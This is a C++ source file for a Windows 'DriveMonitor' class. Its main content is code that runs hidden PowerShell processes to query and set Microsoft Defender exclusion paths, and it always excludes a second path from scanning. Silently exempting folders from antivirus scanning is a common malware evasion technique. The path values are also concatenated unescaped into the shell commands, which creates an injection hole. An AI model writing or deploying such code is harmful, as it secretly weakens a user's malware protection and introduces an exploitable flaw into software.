#include "drive_monitor.h"
#include <windows.h>
#include <string>

bool DriveMonitor::isDriveAvailable() {
    return GetDriveTypeW(pathToExclude1.c_str()) != DRIVE_NO_ROOT_DIR;
}

bool DriveMonitor::runSilent(const std::wstring& command) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::wstring modifiableCmd = command;
    
    if (CreateProcessW(nullptr, &modifiableCmd[0], nullptr, nullptr, FALSE, 
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool DriveMonitor::isExclusionSet(const std::wstring& path) {
    std::wstring checkCmd = L"powershell -Command \"(Get-MpPreference).ExclusionPath -contains '" + path + L"'\"";
    std::wstring output;
    
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    HANDLE hRead, hWrite;
    
    if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        std::wstring modifiableCmd = checkCmd;
        if (CreateProcessW(nullptr, &modifiableCmd[0], nullptr, nullptr, TRUE, 
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hWrite);
            WaitForSingleObject(pi.hProcess, INFINITE);
            
            wchar_t buffer[4096];
            DWORD bytesRead;
            std::wstring result;
            
            while (ReadFile(hRead, buffer, sizeof(buffer) - sizeof(wchar_t), &bytesRead, nullptr) && bytesRead) {
                buffer[bytesRead / sizeof(wchar_t)] = L'\0';
                result += buffer;
            }
            
            output = result;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        CloseHandle(hRead);
    }
    
    return output.find(L"True") != std::wstring::npos;
}

void DriveMonitor::setExclusions(bool enable) {
    if (isExclusionSet(pathToExclude1) != enable) {
        std::wstring cmd = enable ? 
            L"powershell -Command \"Add-MpPreference -ExclusionPath '" + pathToExclude1 + L"'\"" :
            L"powershell -Command \"Remove-MpPreference -ExclusionPath '" + pathToExclude1 + L"'\"";
        runSilent(cmd);
    }
    
    // Always set exclusion for the second path
    if (!isExclusionSet(pathToExclude2)) {
        std::wstring addCmd = L"powershell -Command \"Add-MpPreference -ExclusionPath '" + pathToExclude2 + L"'\"";
        runSilent(addCmd);
    }
}
